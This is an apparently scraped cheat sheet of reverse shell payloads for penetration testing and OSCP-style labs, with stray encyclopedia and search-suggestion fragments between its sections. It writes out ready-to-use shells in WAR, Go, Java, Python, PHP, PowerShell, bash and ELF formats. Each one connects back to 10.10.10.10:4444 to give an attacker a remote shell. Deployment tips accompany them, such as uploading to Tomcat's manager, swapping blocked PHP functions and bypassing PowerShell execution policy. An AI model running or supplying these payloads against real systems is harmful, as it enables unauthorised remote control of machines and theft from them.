1. WAR (Java Web App)
Used for Tomcat exploitation. Deploy via /manager/html.

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f war -o shell.war

✅ Upload and access at http://target:8080/shell/randomname.jsp


Apache Tomcat
an implementation of the Java Servlet, JavaServer Pages, Java Expression Language and Java WebSocket technologies
Wikipedia
tomcat.apache.org
Apache Tomcat logo
2. Go (Golang)
Run directly on target if go is installed (rare), or compile locally.

# One-liner reverse shell
echo 'package main;import"net";import"os/exec";func main(){c,_:=net.Dial("tcp","10.10.10.10:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/sh.go && go run /tmp/sh.go

✅ No compilation needed — ideal for quick shells


Golang reverse shell one-liner OSCP





3. Java (Standalone JAR)
For .jar files — compile .java to .class and package.

# Create simple reverse shell .java
echo 'public class Shell { static { try { Runtime.getRuntime().exec("/bin/sh -c \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f\""); } catch (Exception e) {} } }' > Shell.java

# Compile and package
javac Shell.java
jar cvf shell.jar Shell.class

✅ Run on target with: java -jar shell.jar


Backdooring Java JAR files for pentesting site:reddit.com





4. Python (Py)
Universal — works almost everywhere.

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.10",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; pty.spawn("/bin/bash")

✅ Run with: python3 shell.py
✅ No compilation — just transfer and execute


Python reverse shell for OSCP





5. PHP
Perfect for web uploads (RCE, LFI, etc).

<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f"); ?>

✅ Save as shell.php, upload, access via browser
✅ Also works with exec, passthru, shell_exec if system is blocked


PHP reverse shell one-liner





6. C/C++
For privilege escalation exploits.

gcc -fno-stack-protector -z execstack -m32 -o exploit exploit.c

✅ Use -m32 for 32-bit targets, omit for 64-bit
✅ Add -static if missing libraries on target


GNU Compiler Collection
optimizing compiler produced by the GNU Project, key component of the GNU tool-chain and standard compiler for most projects related to GNU and the Linux kernel.
Wikipedia
gcc.gnu.org
GNU Compiler Collection logo
7. PowerShell (PS1)
Windows targets — no compilation needed.

$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

✅ Run with: powershell.exe -exec bypass -c .\shell.ps1


PowerShell reverse shell OSCP





8. ELF & Shell Scripts
For quick binaries or interpreted execution.

Bash One-Liner:

bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

Compile with MSFVenom (ELF):

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf

✅ chmod +x shell.elf && ./shell.elf
✅ Works on most Linux targets
